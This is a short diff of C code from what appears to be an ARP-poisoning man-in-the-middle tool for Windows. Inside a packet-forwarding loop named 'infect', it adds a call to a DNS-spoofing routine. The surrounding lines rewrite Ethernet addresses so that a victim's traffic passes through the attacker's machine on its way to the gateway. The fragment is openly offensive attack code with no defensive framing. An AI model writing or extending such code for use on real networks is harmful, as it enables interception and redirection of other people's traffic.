@@ -304,14 +304,14 @@ DWORD WINAPI infect(LPVOID lparam)
 		ether_hdr* eth_header;
 		eth_header = (ether_hdr*)pkt_data;
 
+		/* Check for DNS packets */
+		dns_spoofing(pkt_data);
+
 		/* change packet src/dst (MITM) */
 		memcmp(eth_header->src_addr, infect_params.victim_mac, ETH_ALEN) == 0 // if src = taget
 			? memcpy(eth_header->dest_addr, infect_params.gateway_mac, ETH_ALEN) // (dst = gateway)
 			: memcpy(eth_header->dest_addr, infect_params.victim_mac, ETH_ALEN); // else (dst = victim) 
 		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this
-		
-		/* Check for DNS */
-
 
 		/* foward packet */
 		pcap_sendpacket(fp, pkt_data, pkt_header->caplen);
